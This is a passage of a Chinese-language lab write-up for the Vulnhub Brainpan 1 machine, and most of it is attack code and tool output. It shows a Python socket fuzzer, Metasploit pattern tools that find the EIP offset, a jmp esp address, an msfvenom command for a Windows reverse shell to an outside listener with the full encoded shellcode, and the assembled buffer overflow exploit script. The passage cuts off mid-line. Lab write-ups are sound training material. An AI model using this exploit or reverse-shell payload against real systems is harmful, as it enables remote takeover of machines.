port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>
+
+<p>是时候运行brainpan.exe并使用Immunity Debugger附加到进程。在Windows机器上侦听该进程的情况下，在端口9999上放置1000个模糊测试（\x41），看看是否遇到段错误。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;brainpan.exe</span><br><span class="line">[+] initializing winsock...done.</span><br><span class="line">[+] server socket created.</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port 9999</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(_]</span><br><span class="line">[get_reply] copied 1003 bytes to buffer</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub193.jpg"></p>
+<p>AM！造成了我们想要的段错误，所见，已经成功地使用模糊A覆盖了eip。是时候控制自己，享受一些乐趣了。<br>下一步，需要多少字节来填充缓冲区以使eip？使用Metasploit的工具进行此活动。创建一个模式作为开始。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span><br></pre></td></tr></table></figure>
+
+<p>将其添加到模糊测试脚本etfuzz.py中，用模式输出替换掉A的垃圾数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>
+
+<p>下一步。重新启动brainpan.exe进程，重新附加到进程，然后将模糊测试脚本发送给侦听器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;brainpan.exe</span><br><span class="line">[+] initializing winsock...done.</span><br><span class="line">[+] server socket created.</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port 9999</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[get_reply] s = [Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B(_]</span><br><span class="line">[get_reply] copied 1003 bytes to buffer</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub194.jpg"></p>
+<p>再次成功地覆盖了eip。记下指令指针地址35724134，将其推入Metasploit的模式偏移工具中，这将提供为控制eip而需要发送到缓冲区的字节数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134</span></span><br><span class="line">[*] Exact match at offset 524</span><br></pre></td></tr></table></figure>
+
+<p>知道只需要524字节的“垃圾数据”就可以成为eip。相应地编辑模糊测试器，看看是否可以用某些B（\x42）成功覆盖eip。重新运行，重新连接并启动模糊测试器。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub195.jpg"></p>
+<p>瞧！如所见，已成功用4个字节的B覆盖了eip。下一个是什么？接下来，看看是否可以将自己的代码放入esp中。如果可以将代码放入esp，将查找名为jmp esp的函数调用，告诉eip指向esp，从而能够执行存储在esp中的恶意代码。编辑模糊器，使其在esp中包含一堆C（\x43），并查看是否有足够的空间容纳潜在的Shellcode。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\x42&quot;</span> * 4</span><br><span class="line">shellcode = <span class="string">&quot;\x43&quot;</span> * 500</span><br><span class="line"> </span><br><span class="line">payload = junk + eip + shellcode</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub196.jpg"></p>
+<p>正如上面看到的，已经成功地用大量C填充了esp，这使知道有一些可用于放置shellcode的区域。让看看是否可以找到jmp esp函数的地址。在Immunity Debugger中，使用ctrl-f并输入搜索jmp esp。如所见，第一个jmp esp地址是311712F3。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub197.jpg"></p>
+<p>下一步，生成一些shellcode，以测试概念验证（PoC）是否有效。由于要测试的PoC框是一个windoZe机器，因此将使用msfvenom生成一个简单的Windows reverse shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/shikata_ga_nai -b &#x27;\x00&#x27; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 351 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 351</span><br><span class="line">Payload size: 351 bytes</span><br><span class="line">Final size of python file: 1712 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来，让把它们放在一起,payload将如下所示：{junk} {jmp esp地址} {nops + buf}</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad&quot;</span></span><br><span class="line">buf += b<span 